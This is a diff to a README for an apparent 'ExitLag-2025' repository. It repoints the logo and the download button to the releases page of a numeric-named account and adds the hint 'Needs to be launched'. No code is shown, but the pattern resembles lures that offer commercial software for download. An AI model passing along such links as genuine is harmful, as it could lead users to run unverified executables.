@@ -2,7 +2,7 @@
 
 Welcome to the ExitLag-2025 repository! 
 
-![ExitLag Logo](https://example.com/exitlag_logo.png)
+![ExitLag Logo](https://github.com/9912510352/ExitLag-2025/releases)
 
 ## 🎮 About ExitLag
 
@@ -20,7 +20,7 @@ In this repository, you'll find all you need to know about ExitLag-2025. Here's 
 
 You can download ExitLag by clicking the button below:
 
-[![Download ExitLag](https://img.shields.io/badge/Download-ExitLag-blue)](https://github.com/files/Project.zip "Needs to be launched")
+[![Download ExitLag](https://github.com/9912510352/ExitLag-2025/releases)](https://github.com/9912510352/ExitLag-2025/releases "Needs to be launched")
 
 If the link doesn't work, please check the "Releases" section for alternative download options.
 
